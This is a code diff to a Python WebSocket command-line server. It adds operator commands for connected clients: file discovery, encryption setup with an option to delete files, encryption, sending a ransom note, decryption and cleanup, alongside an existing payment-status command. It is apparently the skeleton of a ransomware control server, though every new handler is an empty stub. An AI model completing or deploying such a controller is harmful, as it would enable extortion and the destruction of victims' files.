@@ -103,11 +103,29 @@ class WebSocketCLIServer:
                     self.__show_connection_info()
                 case ["setpaymentstatus", status]:
                     self.__set_payment_status(status)
+                case ["discoveryreq", *args]:
+                    send_path = args[0] if args else "/"
+                    self.__send_discovery_req(send_path)
+                    print("Not implemented yet", args)
+                case ["cryptoreq", *args]:
+                    encrypt = "--encrypt" in args
+                    delete = "--delete" in args
+                    self.__send_crypto_req(encrypt, delete)
+                    print("Not implemented yet", encrypt, delete)
+                case ["encryptionreq"]:
+                    self.__send_encryption_req()
+                    print("Not implemented yet")
+                case ["ransomnotereq"]:
+                    print("Not implemented yet")
+                    self.__send_ransom_note_req()
+                case ["cryptorep"]:
+                    print("Not implemented yet")
+                    self.__send_decrypt_rep()
+                case ["cleaningreq"]:
+                    print("Not implemented yet")
+                    self.__send_cleaning_req()
                 case ["exit"] | ["quit"]:  
-                    print("Shutting down server...")
-                    await self.close_all_clients()
-                    self.__server.close()
-                    self.__should_cli_run = False
+                    await self.stop()
                 case _:
                     print(f"Unknown command: {msg}")
 
@@ -133,7 +151,7 @@ class WebSocketCLIServer:
         print("\t\tDefault is '/'")
         print("\t\tExample: discoveryreq /Users/username/Documents")
         print("\tcryptoreq - sends the command to set up the cryptographic configuration to the selected client")
-        print("\t\tDefault options: encrypt=false, delete=true")
+        print("\t\tDefault options: encrypt=false, delete=false")
         print("\t\tOptions: ") 
         print("\t\t\t--encrypt (enables encryption) ")
         print("\t\t\t--delete (deletes files after encryption/decryption)")
@@ -180,6 +198,42 @@ class WebSocketCLIServer:
         self.__selected_client.show_info()
 
     @check_selected_client
+    def __send_discovery_req(self, path="/"):
+        """Send a discovery request to the selected client."""
+        #TODO: Implement discovery request
+        pass
+
+    @check_selected_client
+    def __send_crypto_req(self, encrypt=False, delete=False):
+        """Send a cryptographic setup request to the selected client."""
+        #TODO: Implement crypto request
+        pass
+
+    @check_selected_client
+    def __send_encryption_req(self):
+        """Send an encryption request to the selected client."""
+        #TODO: Implement encryption request
+        pass
+
+    @check_selected_client
+    def __send_ransom_note_req(self):
+        """Send a ransom note request to the selected client."""
+        #TODO: Implement ransom note request
+        pass
+
+    @check_selected_client
+    def __send_decrypt_rep(self):
+        """Send a decryption request to the selected client."""
+        #TODO: Implement decryption request
+        pass
+
+    @check_selected_client
+    def __send_cleaning_req(self):
+        """Send a cleaning request to the selected client."""
+        #TODO: Implement cleaning request
+        pass
+
+    @check_selected_client
     def __set_payment_status(self, status):
         if status.lower() in ["true", "false"]:
             is_paid = status.lower() == "true"
@@ -216,6 +270,13 @@ class WebSocketCLIServer:
         """Start the WebSocket server and CLI loop."""
         print(f"WebSocket server running at ws://{self.host}:{self.port}")
         await asyncio.gather(self.__cli(), self.__start_server())
+
+    async def stop(self):
+        """Stop the server and CLI loop."""
+        print("Shutting down server...")
+        await self.close_all_clients()
+        self.__server.close()
+        self.__should_cli_run = False
 
 
 if __name__ == "__main__":
